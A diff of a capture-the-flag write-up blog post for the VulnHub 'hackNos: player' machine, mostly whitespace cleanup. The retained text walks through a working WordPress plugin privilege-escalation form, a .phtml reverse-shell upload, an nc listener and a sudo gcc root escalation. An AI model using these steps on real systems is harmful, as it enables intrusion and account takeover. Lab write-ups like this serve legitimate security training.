@@ -11,31 +11,31 @@
 <body onload="setup()">
 <h1>/f0c1s/blog/sec/vulnhub/hackNos-player-1.1</h1>
 
-<p>
+<nav>
     <a href="../../../index.html">/blog</a>
     <a href="../../index.html">Security</a>
     <a href="../index.html">VulnHub</a>
     <a href="../../../sec/vulnhub/hackNos-player-1.1/hackNos-player-1.1.html">+ hackNos: player v1.1 - 2021.12.30 Thursday</a>
-</p>
+</nav>
 
-## Description
+## DescriptionTTTR
 
 > Difficulty: Intermediate
-> 
+>
 > Learning: Web Application | Enumerate | Good Enumeration | Privilege Escalation
-> 
+>
 > Overview:
-> 
+>
 > Tested: VirtualBox/VMWare
-> 
+>
 > Virtual Machine: - Format: Virtual Machine Virtualbox OVA
-> 
+>
 > Networking: - DHCP Service: Enabled
-> 
+>
 > twitter @rahul_gehlaut
-> 
+>
 > \## Changelog v1.1 - 2020-04-10 v1.0 - 2020-04-07
-> 
+>
 
 [VulnHub: https://www.vulnhub.com/entry/hacknos-player-v11,459/](https://www.vulnhub.com/entry/hacknos-player-v11,459/)
 [Series: https://www.vulnhub.com/series/hacknos,257/](https://www.vulnhub.com/series/hacknos,257/)
@@ -50,23 +50,23 @@ fping -aAqg 192.168.56.1/24 | tee fping.txt
 192.168.56.2
 192.168.56.70
 192.168.56.85
-                                                                                                                                                                                                                                           
+
 ```
 
 Alternatively:
 
 ```shell
 sudo netdiscover -r 192.168.56.1/24 -i eth1
- 
- Currently scanning: Finished!   |   Screen View: Unique Hosts                                                    
-                                                                                                                  
- 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                  
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
  _____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
  -----------------------------------------------------------------------------
- 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                 
- 192.168.56.2    08:00:27:f7:0e:49      1      60  PCS Systemtechnik GmbH                                         
- 192.168.56.85   08:00:27:ed:b6:00      1      60  PCS Systemtechnik GmbH                                         
+ 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
+ 192.168.56.2    08:00:27:f7:0e:49      1      60  PCS Systemtechnik GmbH
+ 192.168.56.85   08:00:27:ed:b6:00      1      60  PCS Systemtechnik GmbH
 
 ```
 
@@ -77,7 +77,7 @@ sudo netdiscover -r 192.168.56.1/24 -i eth1 -PN
  192.168.56.85   08:00:27:ed:b6:00      1      60  PCS Systemtechnik GmbH
 
 -- Active scan completed, 3 Hosts found.
-                                                                                                                   
+
 ```
 
 ```shell
@@ -90,7 +90,7 @@ Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
 
 3 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.9.7: 256 hosts scanned in 1.980 seconds (129.29 hosts/sec). 3 responded
-                                                                                                                   
+
 ```
 
 OR even simple nmap would have sufficed
@@ -103,20 +103,20 @@ Host is up (0.00098s latency).
 Nmap scan report for 192.168.56.85
 Host is up (0.0017s latency).
 Nmap done: 256 IP addresses (2 hosts up) scanned in 2.45 seconds
-                                                                                                                   
+
 ```
 
 Setting up the IPs and ports.
 
 ```shell
-export RHOST="192.168.56.85"    
+export RHOST="192.168.56.85"
 export LHOST="192.168.56.70"
 export LPORT="443"
 
 ```
 
 ```shell
-_n $RHOST  
+_n $RHOST
 firing nmap 192.168.56.85 | tee nmap.default.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:25 IST
 Nmap scan report for 192.168.56.85
@@ -127,7 +127,7 @@ PORT     STATE SERVICE
 3306/tcp open  mysql
 
 Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
-                                                                                                                                                                                                                                           
+
 ```
 
 ```shell
@@ -142,7 +142,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: Apache2 Debian Default Page: It works
 |_http-server-header: Apache/2.4.38 (Debian)
 3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
-| mysql-info: 
+| mysql-info:
 |   Protocol: 10
 |   Version: 5.5.5-10.3.18-MariaDB-0+deb10u1
 |   Thread ID: 39
@@ -154,12 +154,12 @@ PORT     STATE SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
-                                                                                                                                                                                                                                           
+
 ```
 
 ```shell
 sudo nmap $RHOST -n -p80,3306 -Pn -T4 --min-rate=5000 --top-ports=100 -sVC -A --script=*enum* | tee nmap.deep-enum.txt
-[sudo] password for f0c1s: 
+[sudo] password for f0c1s:
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:26 IST
 Nmap scan report for 192.168.56.85
 Host is up (0.00088s latency).
@@ -168,8 +168,8 @@ PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
 |_http-server-header: Apache/2.4.38 (Debian)
 3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
-| mysql-enum: 
-|   Valid usernames: 
+| mysql-enum:
+|   Valid usernames:
 |     root:<empty> - Valid credentials
 |     netadmin:<empty> - Valid credentials
 |     guest:<empty> - Valid credentials
@@ -195,11 +195,11 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
-                                                                                                                                                                                                                                           
+
 ```
 
 ```shell
-sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt               
+sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:26 IST
 Nmap scan report for 192.168.56.85
 Host is up (0.00045s latency).
@@ -208,7 +208,7 @@ Not shown: 94 open|filtered udp ports (no-response), 6 closed udp ports (port-un
 MAC Address: 08:00:27:ED:B6:00 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
-                                                                                                                                                                                                                                           
+
 ```
 
 ```shell
@@ -225,7 +225,7 @@ nikto -C all -host http://$RHOST | tee nikto.txt
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Server may leak inodes via ETags, header found with file /, inode: 2962, size: 59d6a8bf07689, mtime: gzip
-+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
 + OSVDB-3233: /icons/README: Apache default file found.
 + 26522 requests: 0 error(s) and 6 item(s) reported on remote host
 + End Time:           2021-12-28 15:28:05 (GMT5.5) (85 seconds)
@@ -239,7 +239,7 @@ nikto -C all -host http://$RHOST | tee nikto.txt
 dirb http://$RHOST
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -249,23 +249,23 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://192.168.56.85/ ----
-+ http://192.168.56.85/index.html (CODE:200|SIZE:10594)                                                           
-==> DIRECTORY: http://192.168.56.85/javascript/                                                                   
-+ http://192.168.56.85/server-status (CODE:403|SIZE:278)                                                          
-                                                                                                                  
++ http://192.168.56.85/index.html (CODE:200|SIZE:10594)
+==> DIRECTORY: http://192.168.56.85/javascript/
++ http://192.168.56.85/server-status (CODE:403|SIZE:278)
+
 ---- Entering directory: http://192.168.56.85/javascript/ ----
-==> DIRECTORY: http://192.168.56.85/javascript/jquery/                                                            
-                                                                                                                  
+==> DIRECTORY: http://192.168.56.85/javascript/jquery/
+
 ---- Entering directory: http://192.168.56.85/javascript/jquery/ ----
-+ http://192.168.56.85/javascript/jquery/jquery (CODE:200|SIZE:271809)                                            
-                                                                                                                  
++ http://192.168.56.85/javascript/jquery/jquery (CODE:200|SIZE:271809)
+
 -----------------
 END_TIME: Tue Dec 28 15:31:52 2021
 DOWNLOADED: 13836 - FOUND: 3
-                                                                                                                   
+
 ```
 
 ```shell
@@ -279,8 +279,8 @@ Scanning: http://192.168.56.85/javascript
 ![1.forbidden](1.forbidden.png)
 
 ```shell
-mysql -h $RHOST -u root  -p               
-Enter password: 
+mysql -h $RHOST -u root  -p
+Enter password:
 ERROR 1698 (28000): Access denied for user 'root'@'192.168.56.70'
 ```
 
@@ -289,7 +289,7 @@ ERROR 1698 (28000): Access denied for user 'root'@'192.168.56.70'
 ![3.go-web](3.go-web.png)
 
 ```shell
-wpscan --url http://192.168.56.85/g@web/ --api-token="$WP_API_TOKEN" --enumerate ap,at,cb,dbe,u          
+wpscan --url http://192.168.56.85/g@web/ --api-token="$WP_API_TOKEN" --enumerate ap,at,cb,dbe,u
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -646,11 +646,11 @@ Interesting Finding(s):
 [+] Data Received: 3.731 MB
 [+] Memory used: 303.641 MB
 [+] Elapsed time: 00:00:20
-                                                                                                                   
+
 ```
 
 ```shell
-feroxbuster -q -u http://192.168.56.85/g@web/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k          
+feroxbuster -q -u http://192.168.56.85/g@web/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
 301        9l       28w      325c http://192.168.56.85/g@web/wp-content
 301        9l       28w      332c http://192.168.56.85/g@web/wp-content/themes
 301        9l       28w      333c http://192.168.56.85/g@web/wp-content/uploads
@@ -678,34 +678,34 @@ Scanning: http://192.168.56.85/g@web/
 Scanning: http://192.168.56.85/g@web/wp-content
 Scanning: http://192.168.56.85/g@web/wp-includes
 Scanning: http://192.168.56.85/g@web/wp-admin
-                                                                                                                   
+
 ```
 
 
 ```shell
-gobuster dir --url http://$RHOST/g@web -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q 
+gobuster dir --url http://$RHOST/g@web -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q
 /index.php            (Status: 301) [Size: 0] [--> http://192.168.56.85/g@web/]
 /wp-content           (Status: 301) [Size: 325] [--> http://192.168.56.85/g@web/wp-content/]
-/wp-login.php         (Status: 200) [Size: 4660]                                            
-/license.txt          (Status: 200) [Size: 19935]                                           
+/wp-login.php         (Status: 200) [Size: 4660]
+/license.txt          (Status: 200) [Size: 19935]
 /wp-includes          (Status: 301) [Size: 326] [--> http://192.168.56.85/g@web/wp-includes/]
-/wp-trackback.php     (Status: 200) [Size: 135]                                              
-/wp-admin             (Status: 301) [Size: 323] [--> http://192.168.56.85/g@web/wp-admin/]   
-/xmlrpc.php           (Status: 405) [Size: 42]                                               
+/wp-trackback.php     (Status: 200) [Size: 135]
+/wp-admin             (Status: 301) [Size: 323] [--> http://192.168.56.85/g@web/wp-admin/]
+/xmlrpc.php           (Status: 405) [Size: 42]
 /wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.56.85/g@web/wp-login.php?action=register]
-                                                                                                                   
+
 ```
 
 
 ```shell
-ffuf -u http://$RHOST/g@web/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 | grep -vi "Size: 0"    
+ffuf -u http://$RHOST/g@web/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 | grep -vi "Size: 0"
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v1.3.1 Kali Exclusive <3
 ________________________________________________
@@ -726,20 +726,20 @@ wp-trackback            [Status: 200, Size: 135, Words: 11, Lines: 5]
 wp-links-opml           [Status: 200, Size: 230, Words: 12, Lines: 12]
 xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1]
 :: Progress: [107982/107982] :: Job [1/1] :: 3544 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
-                                                                                                                   
+
 ```
 
 ```shell
 ffuf -u http://$RHOST/g@web/FUZZ.txt -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 -s | grep -vi "Size: 0"
 license
 
-                                                                                                                   
+
 ```
 
 ```shell
 ffuf -u http://$RHOST/g@web/FUZZ.js -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 -s
 
-                                                                                                                   
+
 ```
 
 ![4.hidden-responsive-ticket-system](4.hidden-responsive-ticket-system.png)
@@ -781,7 +781,7 @@ WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection 
 --------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 Papers: No Results
-                                                                                                                   
+
 ```
 
 ```shell
@@ -792,13 +792,13 @@ searchsploit -m php/webapps/41006.txt
 File Type: ASCII text
 
 Copied to: /home/f0c1s/vuln-hubs/hackNos/player-1.1/41006.txt
-                                                                                                                   
+
 ```
 
 ### exploit to get admin access
 
 ```shell
-cat 41006.txt                  
+cat 41006.txt
 # Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
 # Date: 10-01-2017
 # Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
@@ -822,7 +822,7 @@ http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege
         <input type="submit" value="Login">
 </form>
 
-Then you can go to admin panel.                                                                                                                   
+Then you can go to admin panel.
 ```
 
 #### Get cookies
@@ -838,7 +838,7 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 > Accept: */*
 > Content-Length: 53
 > Content-Type: application/x-www-form-urlencoded
-> 
+>
 * Mark bundle as not supporting multiuse
 < HTTP/1.1 200 OK
 < Date: Tue, 28 Dec 2021 11:22:40 GMT
@@ -854,9 +854,9 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 < Set-Cookie: wordpress_logged_in_c2c223ba385e99f28ec25035b2629d7a=wp-local%7C1640863360%7CwXcFLLTB8msCvhmMa68Sr68BFwzvS9SiibTpCr7PSXs%7C0cf54612721bb8b61f5659417cb2830674672bc351c90e38f45fbbd4a5382319; path=/g@web/; HttpOnly
 < Content-Length: 0
 < Content-Type: text/html; charset=UTF-8
-< 
+<
 * Connection #0 to host 192.168.56.85 left intact
-                                                                                                                   
+
 ```
 
 #### Create a web page and do this from web
@@ -864,7 +864,7 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 It is just a bit easier.
 
 ```shell
-cat get-login.html  
+cat get-login.html
 <p>The admin is wp-local, we know this from wpscan</p>
 
 <form method="post" action="http://192.168.56.85/g@web/wp-admin/admin-ajax.php">
@@ -874,7 +874,7 @@ cat get-login.html
         <input type="submit" value="Login">
 </form>
 
-                                                                                                                   
+
 ```
 
 ![7.before-attack](7.before-attack.png)
@@ -907,7 +907,7 @@ This is because "includes/admin/attachment/uploadAttachment.php" contains this c
 ...
 ```
 
-But it does not check for other extensions like ".phtml". 
+But it does not check for other extensions like ".phtml".
 
 In addition, it saves the file with a predictable name based on the timestamp, and anyone can load the file and run the code it contains.
 
@@ -936,14 +936,14 @@ In addition, it saves the file with a predictable name based on the timestamp, a
 ```
 
 ```shell
-cat upload-rshell.html 
+cat upload-rshell.html
 <form method="post" enctype="multipart/form-data" action="http://192.168.56.85/g@web/wp-admin/admin-ajax.php">
     <input type="hidden" name="action" value="wpsp_upload_attachment">
     Choose a file ending with .phtml:
     <input type="file" name="0">
     <input type="submit" value="Submit">
 </form>
-                                                                                                                   
+
 ```
 
 ![9.before-upload](9.before-upload.png)
@@ -998,8 +998,8 @@ curl http://192.168.56.85/g@web/wp-content/uploads/wpsp/1640691390_rshell.phtml
 ```
 
 ```shell
-sudo nc -nlvp $LPORT -s $LHOST 
-[sudo] password for f0c1s: 
+sudo nc -nlvp $LPORT -s $LHOST
+[sudo] password for f0c1s:
 Listening on 192.168.56.70 443
 Connection received on 192.168.56.85 40084
 Linux hacknos 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
@@ -1246,7 +1246,7 @@ We alread have it.
 ```shell
 MariaDB [hackNos]> select * from wp_usermeta;
 ...
-| 4 | 1 | description | you can upgrade you shell using hackNos@9012!! |  
+| 4 | 1 | description | you can upgrade you shell using hackNos@9012!! |
 ...
 ```
 
@@ -1344,7 +1344,7 @@ Matching Defaults entries for hunter on hacknos:
 
 User hunter may run the following commands on hacknos:
     (ALL) NOPASSWD: /usr/bin/gcc
-hunter@hacknos:/var/www/html$ 
+hunter@hacknos:/var/www/html$
 
 hunter@hacknos:/var/www/html$ sudo gcc -wrapper /bin/sh,-s .
 
